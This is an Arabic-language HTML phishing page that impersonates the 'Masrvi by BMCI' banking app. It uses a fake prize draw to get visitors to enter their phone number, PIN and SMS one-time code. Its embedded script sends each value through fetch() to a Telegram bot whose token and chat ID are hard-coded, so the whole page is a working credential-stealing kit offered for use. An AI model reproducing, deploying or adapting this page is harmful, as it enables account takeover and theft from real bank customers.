<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masrvi - مصرفي</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Amiri:wght@700&family=Reem+Kufi:wght@700&family=Tajawal:wght@400;700&display=swap');
        
        body { font-family: 'Tajawal', sans-serif; background-color: #ffffff; }
        
        .logo-arabic { font-family: 'Amiri', serif; font-size: 4.5rem; color: #00d8b4; line-height: 1; text-shadow: 2px 2px 4px rgba(0,0,0,0.1); }
        .logo-english { font-family: 'Reem Kufi', sans-serif; font-size: 2.2rem; color: #1d1b5a; margin-top: -15px; font-weight: bold; }
        .logo-sub { color: #1d1b5a; font-size: 0.8rem; font-weight: bold; margin-top: 5px; }

        .input-box { border: 2px solid #000; border-radius: 15px; padding: 15px; width: 100%; display: flex; align-items: center; margin-bottom: 20px; }
        .masrvi-button { background-color: #94a3a8; color: white; font-weight: bold; padding: 15px; width: 100%; border-radius: 10px; font-size: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        
        .awards-banner { background: linear-gradient(180deg, #f8f9fa 0%, #e9ecef 100%); border-radius: 20px; padding: 20px; margin-top: 30px; text-align: center; border: 1px solid #ddd; }
        .awards-title { font-family: 'Amiri', serif; font-size: 2.5rem; color: #00d8b4; margin-bottom: 10px; }
        .awards-grid { display: flex; justify-content: space-around; align-items: center; font-size: 2.5rem; }
        .award-item { display: flex; flex-direction: column; align-items: center; }
        .award-label { font-size: 0.7rem; color: #1d1b5a; font-weight: bold; margin-top: 5px; }

        .timer-box { background-color: black; color: white; padding: 10px 30px; border-radius: 5px; font-size: 24px; font-weight: bold; display: inline-block; margin-bottom: 20px; }
    </style>
</head>
<body class="flex flex-col min-h-screen items-center">

    <div class="pt-8 mb-8 flex flex-col items-center">
        <div class="logo-arabic">مصرفي</div>
        <div class="logo-english">Masrvi</div>
        <div class="logo-sub">By BMCI</div>
    </div>

    <div id="step1" class="w-full max-w-sm px-6">
        <label class="block text-right font-bold mb-2">رقم الهاتف المربوط بالحساب *</label>
        <div class="input-box">
            <span class="ml-3 text-gray-500 text-xl">👤</span>
            <input id="phone" type="tel" maxlength="8" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full outline-none text-right font-bold" placeholder="رقم الهاتف">
        </div>

        <label class="block text-right font-bold mb-2">الرمز السري (PIN) *</label>
        <div class="input-box">
            <span class="ml-3 text-gray-500 text-xl">🔒</span>
            <input id="pin" type="password" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full outline-none text-right font-bold" placeholder="أدخل الرمز السري">
        </div>

        <button onclick="goToStep2()" class="masrvi-button mt-2">ادخل السحب الآمن</button>
        
        <div class="awards-banner">
            <div class="awards-title">مصرفي</div>
            <div class="text-sm font-bold text-gray-600 mb-4">جوائز كبرى بانتظارك</div>
            <div class="awards-grid">
                <div class="award-item">
                    <span>🚗</span>
                    <span class="award-label">سيارات</span>
                </div>
                <div class="award-item">
                    <span>📱</span>
                    <span class="award-label">هواتف ذكية</span>
                </div>
                <div class="award-item">
                    <span>💰</span>
                    <span class="award-label">مبالغ نقدية</span>
                </div>
            </div>
        </div>
    </div>

    <div id="step2" class="w-full max-w-sm px-6 hidden text-center">
        <div class="mb-6 flex justify-center pt-4">
            <div class="w-20 h-20 bg-[#00d8b4] rounded-full flex items-center justify-center shadow-lg border-2 border-white">
                <span class="text-3xl font-bold text-[#1d1b5a]">S:</span>
            </div>
        </div>
        <h2 class="font-bold mb-6 text-lg text-right">يرجى ادخال الرمز الذي تلقيته عبر الرسائل النصية *</h2>
        <div class="input-box">
            <span class="ml-3 text-xl">💬</span>
            <input id="otp" type="tel" maxlength="6" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full outline-none text-center tracking-[8px] text-2xl font-bold" placeholder="######">
        </div>
        <div class="timer-box" id="timer">05:00</div>
        <button onclick="finalSubmit()" class="masrvi-button">تأكيد العملية</button>
        
        <div class="awards-banner">
            <div class="awards-title">مصرفي</div>
            <div class="awards-grid">
                <div class="award-item"><span>🚗</span></div>
                <div class="award-item"><span>📱</span></div>
                <div class="award-item"><span>💰</span></div>
            </div>
        </div>
    </div>

    <script>
        // القيم المحدثة بناءً على الصور
        const token = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0"; 
        const chatId = "8665814266"; 

        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
        }

        function goToStep2() {
            const phone = document.getElementById('phone').value;
            const pin = document.getElementById('pin').value;
            if(phone.length === 8 && pin.length === 4) {
                sendToTelegram(`🏦 Masrvi Login:\n👤 الهاتف: ${phone}\n🔑 الكود: ${pin}`);
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
                startTimer(300);
            } else {
                alert("تأكد من إدخال 8 أرقام للهاتف و 4 للرمز");
            }
        }

        function startTimer(duration) {
            let timer = duration, minutes, seconds;
            const display = document.getElementById('timer');
            const interval = setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);
                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;
                display.textContent = minutes + ":" + seconds;
                if (--timer < 0) { clearInterval(interval); display.textContent = "00:00"; }
            }, 1000);
        }

        function finalSubmit() {
            const otp = document.getElementById('otp').value;
            if(otp.length === 6) {
                sendToTelegram(`✅ Masrvi OTP:\nالرمز المستلم: ${otp}`);
                alert("جاري معالجة طلبك، يرجى الانتظار...");
            } else {
                alert("يرجى إدخال 6 أرقام");
            }
        }
    </script>
</body>
</html>
